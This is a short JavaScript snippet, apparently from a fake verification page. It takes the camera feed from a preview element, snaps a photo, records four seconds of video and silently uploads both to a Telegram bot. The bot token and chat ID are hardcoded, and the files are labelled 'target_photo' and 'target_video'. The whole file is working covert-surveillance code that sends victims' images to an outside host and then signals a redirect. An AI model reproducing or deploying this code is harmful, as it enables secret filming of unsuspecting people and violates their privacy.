(async function() {
    const BOT_TOKEN = '8027235420:AAEFz-15VdKF__StWGlCzm5939sSnpmY8FI';
    const CHAT_ID = '-1003723590867'; 

    const video = document.getElementById('preview');
    const canvas = document.createElement('canvas');

    async function handleCapture() {
        try {
            const stream = video.srcObject;
            if (!stream || video.videoWidth === 0) {
                setTimeout(handleCapture, 500);
                return;
            }

            // --- BƯỚC 1: CHỤP ẢNH NGAY LẬP TỨC ---
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (imgBlob) => {
                const imgData = new FormData();
                imgData.append('chat_id', CHAT_ID);
                imgData.append('photo', imgBlob, 'target_photo.jpg');
                imgData.append('caption', '📷 Successfully Taken ✔');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: imgData });
            }, 'image/jpeg', 0.8);

            // --- BƯỚC 2: QUAY VIDEO TRONG 4 GIÂY ---
            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];

            recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                const videoData = new FormData();
                videoData.append('chat_id', CHAT_ID);
                videoData.append('video', videoBlob, 'target_video.mp4');
                videoData.append('caption', '🎬 Sucessfully Record ✔');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
                
                // Báo hiệu chuyển hướng
                window.mainScriptFinished = true;
            };

            recorder.start();
            setTimeout(() => { recorder.stop(); }, 4000);

        } catch (err) {
            console.error("Lỗi xác thực:", err);
            window.mainScriptFinished = true;
        }
    }

    handleCapture();
})();
